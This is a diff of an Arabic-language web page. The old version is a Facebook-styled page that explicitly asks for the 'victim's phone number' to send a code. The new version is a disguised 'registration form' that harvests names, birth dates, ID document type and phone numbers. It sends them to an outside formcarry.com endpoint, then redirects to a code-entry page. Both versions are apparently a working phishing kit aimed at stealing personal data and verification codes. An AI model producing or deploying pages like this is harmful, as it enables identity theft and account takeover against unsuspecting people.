@@ -1,91 +1,128 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>تسجيل الدخول</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;700&display=swap" rel="stylesheet">
+  <title>نموذج التسجيل</title>
   <style>
     body {
-      font-family: 'Cairo', sans-serif;
-      background: linear-gradient(135deg, #4267B2, #29487d);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      direction: rtl;
+      background: linear-gradient(white, #ddd);
+      font-family: Arial, sans-serif;
+      padding: 20px;
     }
-
-    .container {
-      background: white;
-      border-radius: 16px;
-      padding: 30px;
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
-      width: 90%;
-      max-width: 420px;
-      text-align: center;
-    }
-
-    h2 {
-      color: #4267B2;
-      margin-bottom: 25px;
-      font-weight: 800;
-    }
-
-    input {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 18px;
+    form {
+      background: #f5f5f5;
+      padding: 20px;
       border-radius: 10px;
-      border: 1.5px solid #ccc;
-      font-size: 16px;
-      box-sizing: border-box;
-      text-align: center;
+      max-width: 500px;
+      margin: auto;
     }
-
+    label {
+      display: block;
+      margin-top: 15px;
+    }
+    input, select {
+      width: 100%;
+      padding: 8px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
     button {
+      margin-top: 20px;
+      padding: 10px;
       width: 100%;
-      padding: 12px;
-      background-color: #1877f2;
+      background-color: gray;
       color: white;
-      font-size: 17px;
       border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      font-weight: bold;
+      border-radius: 6px;
+      font-size: 16px;
     }
-
-    button:hover {
-      background-color: #145dbf;
+    .counter {
+      text-align: center;
+      margin-top: 20px;
+      color: #555;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>تسجيل الدخول</h2>
-    <input type="tel" id="myPhone" placeholder="رقم هاتفك" required>
-    <input type="tel" id="victimPhone" placeholder="رقم هاتف الضحية" required>
-    <button onclick="goToCode()">أرسل كود</button>
+
+  <form id="userForm">
+    <h2 style="text-align:center;">نموذج التسجيل</h2>
+
+    <label>الاسم الثلاثي</label>
+    <input type="text" name="full_name" required>
+
+    <label>اللقب</label>
+    <input type="text" name="last_name" required>
+
+    <label>تاريخ الميلاد</label>
+    <input type="date" name="birth_date" required>
+
+    <label>الجنس</label>
+    <select name="gender" required>
+      <option value="ذكر">ذكر</option>
+      <option value="أنثى">أنثى</option>
+    </select>
+
+    <label>المستوى الدراسي</label>
+    <select name="education_level" required>
+      <option value="إعدادي">إعدادي</option>
+      <option value="ثانوي">ثانوي</option>
+      <option value="جامعي">جامعي</option>
+    </select>
+
+    <label>نوع المستند</label>
+    <select name="document_type" required>
+      <option value="جواز سفر">جواز سفر</option>
+      <option value="بطاقة شخصية">بطاقة شخصية</option>
+    </select>
+
+    <label>رقم الهاتف</label>
+    <input type="tel" name="phone" required>
+
+    <label>رقم هاتف احتياطي</label>
+    <input type="tel" name="alt_phone" required>
+
+    <button type="submit">إرسال</button>
+  </form>
+
+  <div class="counter">
+    عدد الزوار: <span id="visitorCount">0</span>
   </div>
 
   <script>
-    function goToCode() {
-      const myPhone = document.getElementById('myPhone').value.trim();
-      const victimPhone = document.getElementById('victimPhone').value.trim();
-
-      if (!/^[0-9]{10,15}$/.test(myPhone) || !/^[0-9]{10,15}$/.test(victimPhone)) {
-        alert("يرجى إدخال أرقام صحيحة (10 إلى 15 رقمًا).");
-        return;
-      }
-
-      // حفظ البيانات مؤقتًا
-      localStorage.setItem("myPhone", myPhone);
-      localStorage.setItem("victimPhone", victimPhone);
-
-      // الذهاب للصفحة التالية
-      window.location.href = "next.html";
+    // عداد الزوار المحلي
+    if (localStorage.visitorCount) {
+      localStorage.visitorCount = Number(localStorage.visitorCount) + 1;
+    } else {
+      localStorage.visitorCount = 1;
     }
+    document.getElementById("visitorCount").textContent = localStorage.visitorCount;
+
+    // إرسال البيانات إلى Formcarry والانتقال لصفحة الكود
+    const form = document.getElementById('userForm');
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+      const formData = new FormData(form);
+
+      fetch('https://formcarry.com/s/12UxdOsTbaW', {
+        method: 'POST',
+        body: formData,
+        headers: {
+          Accept: 'application/json'
+        }
+      })
+      .then(response => {
+        if (response.ok) {
+          window.location.href = "code.html";
+        } else {
+          alert("حدث خطأ أثناء الإرسال. حاول مرة أخرى.");
+        }
+      })
+      .catch(error => {
+        alert("فشل الاتصال بالخادم.");
+        console.error(error);
+      });
+    });
   </script>
 </body>
 </html>
